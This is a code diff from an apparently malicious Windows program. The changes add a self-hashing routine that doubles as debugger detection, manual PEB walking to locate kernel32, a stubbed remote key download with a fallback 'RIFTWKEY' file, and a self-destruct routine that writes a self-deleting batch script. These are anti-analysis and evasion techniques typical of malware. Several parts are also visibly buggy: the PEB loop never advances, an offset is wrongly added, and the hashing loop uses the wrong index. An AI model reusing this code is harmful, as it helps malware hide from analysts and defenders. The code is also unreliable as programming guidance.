@@ -26,151 +26,141 @@ struct TlsCallbackInterface {
 // Global Process Information Block
 PIB* g_PIB;
 
+		// So this is quiet shitty for debugging, basically i just realized that the debugger works by replacing instructions
+		// with int3 interrupts (0xcc), so this basically fucks up the calculations if run under a debugger.
+		// (as a nice sideeffect this might also catch a debugger if it places breakpoints)
 // Tempoerery test fucntion
 status IHashMappedSection2(
 	_Out_ cry::Md5::hash& md5
 ) {
-	// Raw Image
-	size_t nFile;
-	void* pfile = utl::AllocReadFileW(g_PIB->sMod.szMFN, &nFile);
-	PIMAGE_NT_HEADERS pNthR = (PIMAGE_NT_HEADERS)((ptr)pfile + ((PIMAGE_DOS_HEADER)pfile)->e_lfanew);
-	if (pNthR->Signature != IMAGE_NT_SIGNATURE)
-		return -1;
-	if (pNthR->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC)
-		return -2;
-
 	// executive image
 	HMODULE hMod = GetModuleHandleW(nullptr);
 	PIMAGE_NT_HEADERS pNth = (PIMAGE_NT_HEADERS)((ptr)hMod + ((PIMAGE_DOS_HEADER)hMod)->e_lfanew);
 	if (pNth->Signature != IMAGE_NT_SIGNATURE)
-		return -3;
+		return -1; // Invalid Signature
 	if (pNth->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC)
-		return -4;
+		return -2; // Invalid Signature
 
 	// Calculate reloc delta
 	int nRelocDelta = pNth->OptionalHeader.ImageBase - 0x400000;
 
 	// Prepare Hashing
 	BCRYPT_ALG_HANDLE ah;
-	status s = BCryptOpenAlgorithmProvider(&ah, BCRYPT_MD5_ALGORITHM, NULL, NULL);
+	status s = BCryptOpenAlgorithmProvider(&ah, BCRYPT_MD5_ALGORITHM, nullptr, NULL);
 	BCRYPT_HASH_HANDLE hh;
-	s = BCryptCreateHash(ah, &hh, NULL, 0, NULL, 0, NULL);
+	s = BCryptCreateHash(ah, &hh, nullptr, 0, nullptr, 0, NULL);
 
 	// Iterate over Sections
 	PIMAGE_SECTION_HEADER pSh = IMAGE_FIRST_SECTION(pNth);
-	for (char i = 0; i < pNth->FileHeader.NumberOfSections; i++) {
+	for (uint8 i = 0; i < pNth->FileHeader.NumberOfSections; i++) {
 		// Skip if Section is not code_seg or const_seg
-		if (!(pSh->Characteristics & IMAGE_SCN_CNT_CODE || pSh->Characteristics & IMAGE_SCN_CNT_INITIALIZED_DATA))
+		if (!(pSh->Characteristics & (IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_INITIALIZED_DATA)))
 			continue;
 
 		// Make copy of mapped Section
 		void* pImageCopy = VirtualAlloc(nullptr, pSh->Misc.VirtualSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 		memcpy(pImageCopy, (void*)(pSh->VirtualAddress + pNth->OptionalHeader.ImageBase), pSh->Misc.VirtualSize);
+
 		// Calculate the difference between the section base of the mapped and copied version
 		int nBaseDelta = (ptr)pImageCopy - (pSh->VirtualAddress + pNth->OptionalHeader.ImageBase);
 
 		if (nRelocDelta) {
-			PIMAGE_BASE_RELOCATION pBrC = (PIMAGE_BASE_RELOCATION)(pNth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress + pNth->OptionalHeader.ImageBase);
-			while ((ptr)pBrC < ((pNth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress + pNth->OptionalHeader.ImageBase)
+			PIMAGE_BASE_RELOCATION pBr = (PIMAGE_BASE_RELOCATION)(pNth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress + pNth->OptionalHeader.ImageBase);
+			while ((ptr)pBr < ((pNth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress + pNth->OptionalHeader.ImageBase)
 				+ pNth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size)
 			) {
-				if ((ptr)pBrC >= pSh->VirtualAddress && (ptr)pBrC <= pSh->VirtualAddress + pSh->Misc.VirtualSize) {
+				if ((ptr)pBr >= pSh->VirtualAddress && (ptr)pBr <= pSh->VirtualAddress + pSh->Misc.VirtualSize) {
 					// First Relocation Entry
-					struct IMAGE_RELOCATION_ENTRY {
+					const struct IMAGE_RELOCATION_ENTRY {
 						word Offset : 12;
 						word Type : 4;
-					} *pRe = (IMAGE_RELOCATION_ENTRY*)(pBrC + 1);
+					} *pRe = (IMAGE_RELOCATION_ENTRY*)(pBr + 1);
 
 					// iterate over Relocation Entries and apply changes
-					for (word i = 0; i < (pBrC->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_ENTRY); i++)
-						switch (pRe[i].Type) {
+					for (word j = 0; j < (pBr->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_ENTRY); j++)
+						switch (pRe[j].Type) {
 						case IMAGE_REL_BASED_HIGHLOW:
-							*(ptr*)(((pBrC->VirtualAddress + pNth->OptionalHeader.ImageBase) + pRe[i].Offset) + nBaseDelta) -= nRelocDelta;
+							*(ptr*)(((pBr->VirtualAddress + pNth->OptionalHeader.ImageBase) + pRe[j].Offset) + nBaseDelta) -= nRelocDelta;
 							break;
 						case IMAGE_REL_BASED_ABSOLUTE:
 							continue;
 						default:
 							VirtualFree(pImageCopy, 0, MEM_RELEASE);
-							return -3;
+							return -3; // Unknown reloc Type
 						}
 
-					// this would probably be enough, but just to make sure we are on a 32bit boundary
-					// note: after testing i found out that this is enough, as SizeOfBlock includes the paded Entry
-					*(ptr*)&pBrC += pBrC->SizeOfBlock;
+					// Advance to next reloc Block
+					*(ptr*)&pBr += pBr->SizeOfBlock;
 				}
 			}
 		}
 
-		// So this is quiet shitty for debugging, basically i just realized that the debugger works by replacing instructions
-		// with int3 interrupts (0xcc), so this basically fucks up the calculations if run under a debugger.
-		// (as a nice sideeffect this might also catch a debugger if it places breakpoints)
-
 		// Special Handling (make a list of pointers and sizes that will be ignored by checking if they are in the region)
 		// (dont do it through section names (maybe use them es additional checks (probably not tho (has no actuall gains))))
-		static const struct ignore {
+		static const struct region {
 			ptr VirtualAddress;
 			size_t RegionSize;
 		} list[] = {
-			{ 0,  4 },
-			{ 3412, 8 },
-			{ 312, 32 }
+			{ 4, 8 },
+			{ 215, 16 },
+			{ 204, 4 },
+			{ 140, 10 }
 		};
-#if 0 // Old version/idea
-		void* ptr = (pSh->VirtualAddress + pNth->OptionalHeader.ImageBase) + nBaseDelta;
-		for (uint8 j = 0; j < sizeof(list) / sizeof(*list); j++)
-			if ((list[i].VirtualAddress >= pSh->VirtualAddress + pNth->OptionalHeader.ImageBase)
-				&& (list[i].VirtualAddress + list[i].RegionSize <= pSh->VirtualAddress + pNth->OptionalHeader.ImageBase)
-				) {
-				ptr dif = ptr - ((pSh->VirtualAddress + pNth->OptionalHeader.ImageBase) + nBaseDelta)
-					s = BCryptHashData(hh, (uchar*)(ptr), dif, NULL);
-				ptr = dif + list[i].RegionSize;
-			}
-			else {
-				s = BCryptHashData(hh, (uchar*)(ptr), pSh->Misc.VirtualSize, NULL);
-			}
-#else	// NOTE: This ignorelist code is still untested
-		// Generate section ordered ignorelist
-		ignore* ilist = nullptr;
-		size_t nlist = 0;
 
-		uint8 lastsmallestindex = 0;
+		// dynamical sorted array of regions inside sections
+		region* pSortedList = nullptr;
+		size_t nSortedList = 0;
+
+		ptr pSmallestAddress = -1;
 		for (uint8 j = 0; j < sizeof(list) / sizeof(*list); j++) {
-			uint8 smallestindex = -1;
-			for (uint8 n = 0; n < sizeof(list) / sizeof(*list); n++) {
-				if ((list[i].VirtualAddress >= pSh->VirtualAddress + pNth->OptionalHeader.ImageBase)
-					&& (list[i].VirtualAddress + list[i].RegionSize <= pSh->VirtualAddress + pNth->OptionalHeader.ImageBase)
-					) {
-					if (n < smallestindex && n > lastsmallestindex)
-						smallestindex = n;
+			// Current smallest index with bigger element then last smallest element
+			uint8 ci = -1; // set to invalid by default
+			for (int n = 0; n < sizeof(list) / sizeof(*list); n++) {
+				// Check if pointer is within the boundaries of the current section
+				if (list[n].VirtualAddress >= pSh->VirtualAddress + pNth->OptionalHeader.ImageBase
+					&& list[n].VirtualAddress + list[n].RegionSize <= (pSh->VirtualAddress + pNth->OptionalHeader.ImageBase) + pSh->Misc.VirtualSize
+				) {
+					// Check if Sorted list is already valid
+					if (pSortedList) {
+						// Check if ci is still invalid
+						if (ci != (unsigned int)-1) {
+							// Check if current last ellement is bigger then current and that current is smaller then last selected
+							if (list[n].VirtualAddress < list[ci].VirtualAddress && list[n].VirtualAddress > pSortedList[j - 1].VirtualAddress)
+								ci = n;
+						} else if (list[n].VirtualAddress > pSortedList[j - 1].VirtualAddress)
+							ci = n;
+					} else {
+						if (list[n].VirtualAddress < pSmallestAddress)
+							ci = n, pSmallestAddress = list[n].VirtualAddress;
+					}
 				}
 			}
 
-			// probably not enough checks
-			if (smallestindex > lastsmallestindex) {
-				if (ilist)
-					ilist = (ignore*)realloc(ilist, ++nlist * sizeof(ignore));
+			// Check if the last element selected is valid and add it to the list
+			if (ci != (unsigned int)-1) {
+				if (pSortedList)
+					pSortedList = (region*)realloc(pSortedList, ++nSortedList * sizeof(*pSortedList));
 				else
-					ilist = (ignore*)malloc(++nlist * sizeof(ignore));
+					pSortedList = (region*)malloc(++nSortedList * sizeof(*pSortedList));
 
-				ilist[nlist - 1] = list[smallestindex];
-			}
+				pSortedList[j] = list[ci];
+			} else
+				break;
 		}
 
 		// Iterate through ignorelist and hash
 		ptr ptrbase = (pSh->VirtualAddress + pNth->OptionalHeader.ImageBase) + nBaseDelta;
-		if (nlist) {
-			for (uint8 j = 0; j < nlist; j++) {
+		if (nSortedList) {
+			for (uint8 j = 0; j < nSortedList; j++) {
 				ptr dif = ptrbase - ((pSh->VirtualAddress + pNth->OptionalHeader.ImageBase) + nBaseDelta);
 				s = BCryptHashData(hh, (uchar*)(ptrbase), dif, NULL);
-				ptrbase = dif + ilist[i].RegionSize;
+				ptrbase = dif + pSortedList[i].RegionSize;
 			}
-		} else {
+		} else
 			s = BCryptHashData(hh, (uchar*)(ptrbase), pSh->Misc.VirtualSize, NULL);
-		}
 
-		if (ilist)
-			free(ilist);
-#endif
+		if (pSortedList)
+			free(pSortedList);
 
 		// TODO: just hashing the sections here
 		VirtualFree(pImageCopy, 0, MEM_RELEASE);
@@ -183,17 +173,18 @@ status IHashMappedSection2(
 	return 0;
 }
 
+// TODO: fix this mess, for somereason im getting bullshit
 HANDLE GetModuleThroughPebX86(
 	_In_ const wchar* szMod
 ) {
-	void* pPeb = (void*)__readfsdword(0x30);
+	void* pPeb = (void*)(__readfsdword(0x30) + 4096);
 	void* pPebLdrData = (void*)((ptr)pPeb + 0xc);
 	LIST_ENTRY* leModList = (LIST_ENTRY*)((ptr)pPebLdrData + 0x14);
 
 	while (leModList->Flink != leModList) {
 		void* pLdrData = (void*)((ptr)leModList + sizeof(*leModList));
-		void* usDllBaseName = (void*)((ptr)pLdrData + 0x2c);
-		if (!memcmp((wchar*)((ptr)usDllBaseName + 0x4), szMod, *(ushort*)usDllBaseName))
+		void* usDllBaseName = (void*)((ptr)pLdrData + 0x48);
+		if (!memcmp((wchar*)((ptr)usDllBaseName + 0x4), szMod, wcslen(szMod)))
 			return (HANDLE)((ptr)pLdrData + 0x18);
 	}
 
@@ -218,7 +209,11 @@ int WINAPI wWinMain(
 		g_PIB->sArg.v = CommandLineToArgvW(pCmdLine, (int*)&g_PIB->sArg.n);
 	}
 
-	// IHashMappedSection2();
+	// HANDLE hKernel = GetModuleThroughPebX86(L"kernel32");
+	// HANDLE hKernel2 = GetModuleHandleW(L"kernel32");
+
+	cry::Md5::hash md5;
+	IHashMappedSection2(md5);
 
 	BOOL IOpenConsole();
 	IOpenConsole();
@@ -263,7 +258,7 @@ int WINAPI wWinMain(
 		}
 	}
 
-	void* pWKey = utl::IDownloadKey();
+	void* pWKey = 0; // = utl::IDownloadKey();
 	if (!pWKey) {
 		PWSTR szKeyBlob = (PWSTR)malloc(MAX_PATH);
 		PathCchCombine(szKeyBlob, MAX_PATH, g_PIB->sMod.szCD, L"RIFTWKEY"); // Temporery
@@ -296,7 +291,6 @@ int WINAPI wWinMain(
 	free(pDll);
 
 	{	// CleanUp
-		rng::Xoshiro::Instance()->~Xoshiro();
 		LocalFree(g_PIB->sArg.v);
 		free(g_PIB);
 	} return 0;
@@ -326,7 +320,7 @@ VOID ESelfDestruct() {
 
 	// Prepare Script content
 	wchar* pScriptW = (wchar*)malloc(0x800);
-	uint32 uiRandomID = rng::Xoshiro::Instance()->EXoshiroSS();
+	uint32 uiRandomID = rng::Xoshiro::Instance().EXoshiroSS();
 	PCWSTR szMFN = utl::GetFileNameFromPathW(g_PIB->sMod.szMFN);
 	swprintf(pScriptW, l_szSelfDelBat, uiRandomID, szMFN, szMFN, uiRandomID, utl::GetFileNameFromPathW(szFilePath));
 
